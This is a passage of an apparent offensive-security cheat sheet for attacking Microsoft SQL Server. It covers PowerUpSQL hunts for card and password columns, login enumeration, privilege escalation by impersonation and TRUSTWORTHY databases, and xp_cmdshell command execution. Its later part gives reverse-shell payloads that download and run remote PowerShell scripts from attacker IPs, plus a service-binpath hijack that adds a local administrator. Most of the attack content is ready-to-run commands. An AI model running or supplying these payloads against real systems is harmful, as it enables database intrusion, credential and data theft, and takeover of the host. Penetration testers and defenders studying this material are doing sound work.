</span></span></code></pre></div><p>Find sensitive data based on column name, but only target databases with transparent encryption:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=p>|</span> <span class=nb>Get-SQLDatabaseThreaded</span> <span class=n>-Verbose</span> <span class=n>-Threads</span> <span class=mf>10</span> <span class=n>-NoDefaults</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>is_encrypted</span> <span class=o>-eq</span> <span class=s2>&#34;TRUE&#34;</span><span class=p>}</span> <span class=p>|</span> <span class=nb>Get-SQLColumnSampleDataThreaded</span> <span class=n>-Verbose</span> <span class=n>-Threads</span> <span class=mf>10</span> <span class=n>-Keyword</span> <span class=s2>&#34;card, password&#34;</span> <span class=n>-SampleSize</span> <span class=mf>2</span> <span class=n>-ValidateCC</span> <span class=n>-NoDefaults</span>
</span></span></code></pre></div><p>After getting access to a SQL Server, interesting information can be gathered. These queries can be executed with <code>HeidiSQL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- Version
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=o>@@</span><span class=k>version</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Current User
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=n>SUSER_SNAME</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=k>SYSTEM_USER</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Check sa privileges
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=n>IS_SRVROLEMEMBER</span><span class=p>(</span><span class=s1>&#39;sysadmin&#39;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Current Role
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=k>user</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Current database
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=n>db_name</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- All logins on server (gives more results if executed with sa privs)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>server_principals</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>type_desc</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=s1>&#39;SERVER_ROLE&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- All database users for a database
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>USE</span><span class=w> </span><span class=o>&lt;</span><span class=k>database</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>database_principals</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>type_desc</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=s1>&#39;DATABASE_ROLE&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- List all sysadmin (gives more results if executed with sa privs)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=n>type_desc</span><span class=p>,</span><span class=n>is_disabled</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>server_principals</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>IS_SRVROLEMEMBER</span><span class=w> </span><span class=p>(</span><span class=s1>&#39;sysadmin&#39;</span><span class=p>,</span><span class=n>name</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- List all database roles (gives more results if executed with sa privs)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>USE</span><span class=w> </span><span class=o>&lt;</span><span class=k>database</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>DP1</span><span class=p>.</span><span class=n>name</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>DatabaseRoleName</span><span class=p>,</span><span class=w> </span><span class=k>isnull</span><span class=w> </span><span class=p>(</span><span class=n>DP2</span><span class=p>.</span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;No members&#39;</span><span class=p>)</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>DatabaseUserName</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>database_role_members</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>DRM</span><span class=w>  </span><span class=k>RIGHT</span><span class=w> </span><span class=k>OUTER</span><span class=w> </span><span class=k>JOIN</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>database_principals</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>DP1</span><span class=w>  </span><span class=k>ON</span><span class=w> </span><span class=n>DRM</span><span class=p>.</span><span class=n>role_principal_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DP1</span><span class=p>.</span><span class=n>principal_id</span><span class=w>  </span><span class=k>LEFT</span><span class=w> </span><span class=k>OUTER</span><span class=w> </span><span class=k>JOIN</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>database_principals</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>DP2</span><span class=w>  </span><span class=k>ON</span><span class=w> </span><span class=n>DRM</span><span class=p>.</span><span class=n>member_principal_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DP2</span><span class=p>.</span><span class=n>principal_id</span><span class=w>  </span><span class=k>WHERE</span><span class=w> </span><span class=n>DP1</span><span class=p>.</span><span class=k>type</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;R&#39;</span><span class=w> </span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>DP1</span><span class=p>.</span><span class=n>name</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Effective Permissions for the server (more permissions if executed with sa privs)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>fn_my_permissions</span><span class=p>(</span><span class=k>NULL</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;SERVER&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Effective Permissions for the database (more permissions if executed with sa privs)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>USE</span><span class=w> </span><span class=o>&lt;</span><span class=k>database</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>fn_my_permissions</span><span class=p>(</span><span class=k>NULL</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;DATABASE&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Active user token (gives more results if executed with sa privs)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>user_token</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Active login token (gives more results if executed with sa privs)
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>login_token</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- List all databases
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>master</span><span class=p>.</span><span class=n>sys</span><span class=p>.</span><span class=n>databases</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- List all tables in a database
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>Database01</span><span class=p>.</span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- Get row count and content of a table in a database
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=k>COUNT</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>Database01</span><span class=p>.</span><span class=n>dbo</span><span class=p>.</span><span class=n>Table01</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>Database01</span><span class=p>.</span><span class=n>dbo</span><span class=p>.</span><span class=n>Table01</span><span class=w>
</span></span></span></code></pre></div><p>or by <code>Get-SQLQuery</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLQuery</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=n>-Verbose</span> <span class=n>-Query</span> <span class=s2>&#34;SELECT @@version&#34;</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation</h2><p><strong>Summary of Points</strong>:</p><ul><li>OS Commands can be executed if you have a sysadmin login or have been provided explicit permissions to sensitive functionality</li><li>Most command execution options in SQL Server run as the SQL Server service account</li><li>SQL Server service account can be configured as:<ul><li>Local User</li><li>Domain User</li><li>Domain Admin</li><li>etc</li></ul></li><li>SQL Server service account = Sysadmin (and implicitly the SQL Server service process)</li></ul><p>A generic audit for MSSQL issues can be done via:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLAudit</span> <span class=n>-Verbose</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span>
</span></span></code></pre></div><h3 id=public-to-sysadmin>Public to Sysadmin</h3><p><strong>Insecure configurations are very common</strong>:</p><ul><li>Weak passwords<ul><li>default SQL Server, default third party applications, custom SQL logins</li><li>user enumeration helps ;)</li></ul></li><li>Excessive permissions<ul><li>startup procedures, dangerous stored procedures (RWX), xp creation, CLR creation</li><li>impersonation, database ownership, database links, agent jobs</li></ul></li><li>SQL Injection<ul><li>EXECUTE AS LOGIN</li><li>Signed procedures</li></ul></li><li>Out of date versions</li></ul><p>An automatic check for public to sysadmin privilege escalation can be done via:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLEscalatePriv</span> <span class=n>-Verbose</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span>
</span></span></code></pre></div><h4 id=public-to-sysadmin---impersonation>Public to Sysadmin - Impersonation</h4><p>User Impersonation (EXECUTE AS): when EXECUTE AS is used, the execution context is switched to the specified login or user name. This allows impersonation of other users and logins to be able to access resources which means it can be abused to use privileges and objects available to other users.</p><p>The following SQL query allows to find SQL Server logins which can be impersonated in the current database:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=k>distinct</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=n>name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>server_permissions</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=k>INNER</span><span class=w> </span><span class=k>JOIN</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>server_principals</span><span class=w> </span><span class=n>b</span><span class=w> </span><span class=k>ON</span><span class=w> </span><span class=n>a</span><span class=p>.</span><span class=n>grantor_principal_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>b</span><span class=p>.</span><span class=n>principal_id</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>a</span><span class=p>.</span><span class=n>permission_name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;IMPERSONATE&#39;</span><span class=w>
</span></span></span></code></pre></div><p>or it can be done through <code>PowerUpSQL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLAuditPrivImpersonateLogin</span> <span class=n>-Username</span> <span class=s2>&#34;sqluser&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Sql@123&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Exploit sysadmin privileges through user impersonation (does not work if chanined/nested impersonation must be performed to get to &ldquo;sa&rdquo;, in fact only direct sa impersonation is supported):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLAuditPrivImpersonateLogin</span> <span class=n>-Username</span> <span class=s2>&#34;sqluser&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Sql@123&#34;</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=n>-Exploit</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>The exploitation of chained/nested impersonation can be directly done by executing queries in <code>HeidiSQL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=k>SYSTEM_USER</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>IS_SRVROLEMEMBER</span><span class=p>(</span><span class=s1>&#39;sysadmin&#39;</span><span class=p>)</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXECUTE</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>LOGIN</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;dbadmin&#39;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=k>SYSTEM_USER</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXECUTE</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>LOGIN</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;sa&#39;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>IS_SRVROLEMEMBER</span><span class=p>(</span><span class=s1>&#39;sysadmin&#39;</span><span class=p>)</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>ORIGINAL_LOGIN</span><span class=p>()</span><span class=w>
</span></span></span></code></pre></div><h4 id=public-to-sysadmin---trustworthy-database>Public to Sysadmin - Trustworthy database</h4><p>A database property (is_trustworthy_on) used to indicate whether a SQL Server instance trusts a database and its contents. The property is turned off by default as a security measure. Only a sysadmin can set a database to be TRUSTWORTHY. When TRUSTWORTHY is off, impersonated users (by using EXECUTE AS) will only have database-scope permissions but when TRUSTWORTHY is turned on impersonated users can perform actions with server level permissions.</p><p>Look for TRUSTWORTHY database using <code>PowerUpSQL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLAudit</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=n>-Verbose</span> <span class=p>|</span> <span class=nb>Out-GridView</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLAuditPrivTrustworthy</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Look for <strong>TRUSTWORTHY</strong> database (can be done with public role):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>database_name</span><span class=p>,</span><span class=w> </span><span class=n>SUSER_NAME</span><span class=p>(</span><span class=n>owner_sid</span><span class=p>)</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>database_owner</span><span class=p>,</span><span class=w> </span><span class=n>is_trustworthy_on</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>TRUSTWORTHY</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>databases</span><span class=w>
</span></span></span></code></pre></div><p>Look for <strong>db_owner</strong> role (can be done with public role) on the found trustworthy database:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>use</span><span class=w> </span><span class=o>&lt;</span><span class=k>database</span><span class=o>&gt;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>DP1</span><span class=p>.</span><span class=n>name</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>DatabaseRoleName</span><span class=p>,</span><span class=w> </span><span class=k>isnull</span><span class=w> </span><span class=p>(</span><span class=n>DP2</span><span class=p>.</span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;No members&#39;</span><span class=p>)</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>DatabaseUserName</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>database_role_members</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>DRM</span><span class=w>  </span><span class=k>RIGHT</span><span class=w> </span><span class=k>OUTER</span><span class=w> </span><span class=k>JOIN</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>database_principals</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>DP1</span><span class=w>  </span><span class=k>ON</span><span class=w> </span><span class=n>DRM</span><span class=p>.</span><span class=n>role_principal_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DP1</span><span class=p>.</span><span class=n>principal_id</span><span class=w>  </span><span class=k>LEFT</span><span class=w> </span><span class=k>OUTER</span><span class=w> </span><span class=k>JOIN</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>database_principals</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>DP2</span><span class=w>  </span><span class=k>ON</span><span class=w> </span><span class=n>DRM</span><span class=p>.</span><span class=n>member_principal_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DP2</span><span class=p>.</span><span class=n>principal_id</span><span class=w>  </span><span class=k>WHERE</span><span class=w> </span><span class=n>DP1</span><span class=p>.</span><span class=k>type</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;R&#39;</span><span class=w> </span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>DP1</span><span class=p>.</span><span class=n>name</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>Perform EXECUTE AS in <code>HeidiSQL</code>to become the db owner (with elevated privileges) and give a Domain User the sysadmin role:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>EXECUTE</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=k>USER</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;dbowner&#39;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=k>system_user</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_addsrvrolemember</span><span class=w> </span><span class=s1>&#39;DOMAIN\USER&#39;</span><span class=p>,</span><span class=s1>&#39;sysadmin&#39;</span><span class=w>
</span></span></span></code></pre></div><h3 id=sysadmin-to-os-service-account>Sysadmin to OS Service Account</h3><h4 id=sysadmin-to-os-service-account---command-execution-with-xp_cmdshell>Sysadmin to OS Service Account - Command Execution with xp_cmdshell</h4><ul><li><p><code>HeidiSQL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1>-- If xp_cmdshell is uninstalled:
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>sp_addextendedproc</span><span class=w> </span><span class=s1>&#39;xp_cmdshell&#39;</span><span class=p>,</span><span class=s1>&#39;xplog70.dll&#39;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- If xp_cmdshell is disabled:
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_configure</span><span class=w> </span><span class=s1>&#39;show advanced options&#39;</span><span class=p>,</span><span class=mi>1</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>RECONFIGURE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_configure</span><span class=w> </span><span class=s1>&#39;xp_cmdshell&#39;</span><span class=p>,</span><span class=mi>1</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>RECONFIGURE</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_cmdshell</span><span class=w> </span><span class=s1>&#39;whoami&#39;</span><span class=w>
</span></span></span></code></pre></div><p>Execute a payload via HeidiSQL to get a reverse shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>-- Query to be executed in HeidiSQL
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_cmdshell</span><span class=w> </span><span class=s1>&#39;powershell -c test-netconnection 192.168.50.53 -port 80&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_cmdshell</span><span class=w> </span><span class=s1>&#39;powershell -ep bypass -c iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.50.53/powercat.ps1&#39;&#39;); powercat -c 192.168.50.53 -p 4444 -e cmd -v&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_cmdshell</span><span class=w> </span><span class=s1>&#39;powershell -ep bypass -c . \\192.168.50.50\share\PowerUp.ps1; Invoke-AllChecks&#39;</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># On the local machine:</span>
</span></span><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-p</span> <span class=mf>4444</span> <span class=n>-t</span> <span class=mf>1000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Once you get a stable shell you can escalate your privileges</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=p>/</span><span class=n>c</span> <span class=nb>sc </span><span class=n>qc</span> <span class=n>ALG</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=p>/</span><span class=n>c</span> <span class=nb>sc </span><span class=n>config</span> <span class=n>ALG</span> <span class=n>binpath</span><span class=p>=</span> <span class=s2>&#34;net localgroup administrators CYBERLAB\user01 /add&#34;</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=p>/</span><span class=n>c</span> <span class=nb>sc </span><span class=n>qc</span> <span class=n>ALG</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=p>/</span><span class=n>c</span> <span class=nb>sc </span><span class=n>stop</span> <span class=n>ALG</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=p>/</span><span class=n>c</span> <span class=nb>sc start </span><span class=n>ALG</span>
</span></span><span class=line><span class=cl><span class=n>net</span> <span class=n>localgroup</span> <span class=n>administrators</span>
</span></span></code></pre></div></li><li><p><code>Nishang</code>:</p><p>Automatically enable xp_cmdshell and open a shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Execute-Command</span><span class=n>-MSSQL</span> <span class=n>-ComputerName</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-UserName</span> <span class=s2>&#34;sa&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;Password1&#34;</span>
</span></span></code></pre></div><p>Authenticate through windows authentication (for an alternative user you need to launch a new PowerShell session with different credentials) and open a shell:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Execute-Command</span><span class=n>-MSSQL</span> <span class=n>-ComputerName</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-WindowsAuthentication</span> 
</span></span></code></pre></div><p>Authenticate and execute a payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Execute-Command</span><span class=n>-MSSQL</span> <span class=n>-ComputerName</span> <span class=s2>&#34;SQLServer1&#34;</span> <span class=n>-WindowsAuthentication</span> <span class=n>-payload</span> <span class=s2>&#34;iex ((New-Object Net.Webclient).downloadstring(&#39;&#39;http://192.168.254.1/Invoke-PowerShellTcp.ps1&#39;&#39;));Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.1 -Port 443&#34;</span>
</span></span></code></pre></div><p>If no payload is specified it is possible to spawn a shell (powershell, cmd or mssql):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nb>Execute-Command</span><span class=n>-MSSQL</span> <span class=n>-UserName</span> <span class=s1>&#39;sa&#39;</span> <span class=n>-Password</span> <span class=s1>&#39;Password1&#39;</span> <span class=n>-ComputerName</span> <span class=s2>&#34;SQLServer1&#34;</span>
</span></span></code></pre></div></li><li><p><code>PowerUpSQL</code>:</p><p>Automatically enable xp_cmdshell and execute the command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
